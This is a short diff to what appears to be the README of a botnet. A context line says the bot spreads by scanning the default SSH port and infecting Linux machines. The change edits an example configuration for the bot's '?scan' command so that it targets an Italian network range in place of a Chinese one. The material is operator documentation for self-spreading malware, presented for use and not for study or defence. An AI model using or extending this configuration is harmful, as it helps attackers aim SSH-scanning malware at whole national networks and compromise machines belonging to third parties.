@@ -48,7 +48,7 @@ Spread feature of this bot is scan on default SSH port and it will infect on lin
 		# Example:
 		
 			"-it": {				 # This key will be the command of a network arg in "?scan" command. "it" is short form italy.
-				scanNetwork: ChinaNetwork, 	 # Fill the "scanNetwork" that's a value of "Bot" structure. To your network slice.
+				scanNetwork: ItalyNetwork, 	 # Fill the "scanNetwork" that's a value of "Bot" structure. To your network slice.
 				isRandom:    false,		 # Set "isRandom" to false because it's not a full random network.
 			},
 	
